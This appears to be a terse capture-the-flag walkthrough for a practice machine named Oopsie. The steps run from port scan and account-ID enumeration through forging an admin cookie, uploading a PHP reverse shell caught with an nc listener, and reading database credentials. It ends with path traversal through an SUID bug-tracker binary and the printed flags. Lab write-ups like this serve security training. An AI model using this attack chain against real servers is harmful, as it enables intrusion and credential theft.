# Oopsie

---

IP = `10.129.125.109`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

http://10.129.125.109/cdn-cgi/login/admin.php?content=accounts&id=2

Access ID	Name	Email
2233		guest	guest@megacorp.com

http://10.129.125.109/cdn-cgi/login/admin.php?content=accounts&id=1

Access ID	Name	Email
34322		admin	admin@megacorp.com

http://10.129.125.109/cdn-cgi/login/admin.php?content=uploads

```
GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Cookie: user=2233; role=guest
Host: 10.129.125.109
Referer: http://10.129.125.109/cdn-cgi/login/admin.php?content=uploads
Upgrade-Insecure-Requests: 1
```

change the cookie 
Cookie: user=2233; role=guest
Cookie: user=34322; role=admin

```
GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Cookie: user=34322; role=admin
Host: 10.129.125.109
Referer: http://10.129.125.109/cdn-cgi/login/admin.php?content=uploads
Upgrade-Insecure-Requests: 1
```

Upload the php-reverse-shell.php

`nc -lnvp 4444`

load the `http://10.129.125.109/uploads/php-reverse-shell.php`

Got shell!

```
www-data@oopsie:/var/www/html/cdn-cgi/login$ ls
admin.php  db.php  index.php  script.js
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
www-data@oopsie:/var/www/html/cdn-cgi/login$
```

`robert : M3g4C0rpUs3r!`

```
www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
Password:
robert@oopsie:/var/www/html/cdn-cgi/login$
```

```
robert@oopsie:~$ find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker
robert@oopsie:~$ ls -la /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
robert@oopsie:~$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 0
---------------

cat: /root/reports/0: No such file or directory

robert@oopsie:~$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ../root.txt
---------------

af13b0bee69f8a877c3faf667f7beacf

robert@oopsie:~$

```

> user.txt

`f2c74ee8db7983851ab2a96a44eb7981`

> root.txt

`af13b0bee69f8a877c3faf667f7beacf`